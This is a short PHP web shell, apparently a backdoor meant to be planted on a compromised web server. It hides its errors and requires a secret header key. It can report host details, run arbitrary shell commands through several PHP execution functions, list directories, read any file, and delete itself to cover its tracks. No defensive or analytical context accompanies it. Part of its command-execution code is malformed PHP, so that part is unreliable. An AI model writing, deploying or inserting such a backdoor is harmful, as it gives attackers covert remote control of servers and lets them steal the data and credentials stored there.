<?php
@ini_set('display_errors',0);@set_time_limit(0);@ob_start('ob_gzhandler');
$g='base64_decode';$j='json_encode';$h='file_get_contents';
$k=$g("c2VudGluZWx4XzIwMjQ=");$a=$_POST['action']??$_GET['action']??'beacon';
header('Content-Type: application/json');
if(!isset($_SERVER['HTTP_X_AUTH'])||$_SERVER['HTTP_X_AUTH']!==$k){http_response_code(403);exit;}
if($a==='beacon'){echo $j(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname(),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'N/A','cwd'=>getcwd()]]);exit;}
if($a==='exec'){$c=$_POST['cmd']??'';$o='';
foreach(['exec','shell_exec','system','passthru','popen'] as$f){
if(function_exists($f)){$f==='popen'?($h=popen($c,'r')&&while(!feof($h))$o.=fread($h,4096)&&pclose($h)):($o=$f($c));break;}}
echo $j(['status'=>'ok','output'=>$o,'cwd'=>getcwd()]);exit;}
if($a==='file'){$p=$_POST['path']??getcwd();$f=$_POST['faction']??'list';
if($f==='list'){$i=array_diff(scandir($p),['.','..']);$l=[];
foreach($i as$e){$fp="$p/$e";$l[]=['name'=>$e,'type'=>is_dir($fp)?'dir':'file','size'=>is_file($fp)?filesize($fp):0];}
echo $j(['status'=>'ok','items'=>$l,'path'=>realpath($p)]);exit;}
if($f==='read'){echo $j(['status'=>'ok','content'=>is_file($p)?$h($p):'']);exit;}}
if($a==='self_destruct'){@unlink(__FILE__);echo $j(['status'=>'ok']);exit;}